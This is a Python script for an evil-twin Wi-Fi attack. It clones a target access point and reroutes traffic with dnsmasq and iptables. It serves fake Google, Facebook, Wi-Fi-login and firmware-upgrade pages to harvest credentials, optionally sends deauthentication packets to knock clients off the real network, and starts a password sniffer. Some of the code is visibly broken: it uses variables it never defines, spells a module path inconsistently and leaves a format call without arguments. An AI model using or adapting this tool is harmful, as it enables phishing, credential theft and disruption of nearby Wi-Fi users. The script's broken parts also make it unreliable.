import sys
import os
import random
import time
from moduless import methods
from moduless import passsniff


def configs(iface):
    pwd = os.getcwd()

    os.system("xterm -e python3 moduless/dump.py {0}".format(iface))
    essid = input(u"\u001b[33;1m[^] (Target essid)-> ")
    if essid == "":
        print("E...r")
        sys.exit()
    else:
        print(u"\u001b[32;1m[*] Set {0} Target essid!".format(essid))

    bssid = input(u"\u001b[33;1m[^] (Wifi bssid)-> ")
    if bssid == "":
        print("E...r")
        sys.exit()
    else:
        print(u"\u001b[32;1m[*] Set {0} Target bssid!".format(bssid))

    channel = input(u"\u001b[33;1m[^] (Target channel)-> ")
    if channel == "":
        print("E...r")
        sys.exit()
    else:
        print(u"\u001b[32;1m[*] Set {0} Target channel!".format(channel))

    ethstat = input(u"\u001b[33;1m[^] (interface for forward packets)-> ")
    if ethstat == "" or ethstat == " ":
        eth = None
    else:
        eth = ethstat

    ifacemon = "at0"

    result = {
        "essid" : essid,
        "bssid" : bssid,
        "channel" : channel,
        "iface" : iface,
        "eth" : eth,
        "ifacemon" : ifacemon
    }

    return result


def start(iface):
    config = configs(iface)
    print("[*] Create evil twin")
    methods.createfake(config["iface"], config["essid"], config["bssid"], config["channel"])
    print("[*] Configure dnsmasq")
    methods.dnsmasqconfig()
    print("[*] Starting dnsmasq")
    methods.dnsmasqstart()
    print("[*] Set interfaces")
    methods.at0up(config["ifacemon"])
    methods.iptables(config["eth"], config["ifacemon"])
    ipforward = input("[^] IP forward on/off: ")
    if ipforward == "on" or ipforward == "On" or ipforward == "ON":
        print(u"\u001b[32;1m[*] IP forward activate")
        methods.ipforward_on()
    elif ipforward == "off" or ipforward == "Off" or ipforward == "OFF":
        print("[*] IP forward unactivate")
        methods.ipforward_off()
        print("\n\n[^] select page:\n[1] firmware upgrade\n[2] wifi login\n[3] google login\n[4] facebook login")
        page = input("\n: ")
        if page == "1":
            methods.apache2(pwd+"/pages/firmware-upgrade.zip")
        elif page == "2":
            with open(pwd+"/pages/device/index.html", "r") as html:
                code = html.read()
                html.close()
            code = code.replace("{{ target_ap_essid }}", essid)
            methods.apache2(None, code)
        elif page == "3":
            methods.apache2(pwd+"/pages/google-login.zip")
        elif page == "4":
            methods.apache2(pwd+"/pages/facebook-login.zip")

        dos = input("[^] send Deauth packet? yes/no # ")
        if dos == "yes" or dos == "Yes" or dos == "YES":
            clientmac = input("[^] (Client mac address[ff:ff:ff:ff:ff:ff])-> ")
            if clientmac == "" or clientmac == " ":
                print("[*] Set ff:ff:ff:ff:ff:ff Client mac address!")
            wifimac = input("[^] (Wifi Bssid)-> ")
            if wifimac == "" or wifimac == " ":
                print("E...r")
                sys.exit(1)
            print("[*] Set {0} Wifi bssid!")
            os.system("xterm -e python3 modules/Deauth.py {0} {1} {2}".format(clientmac, wifimac, iface))

        passsniff.start()
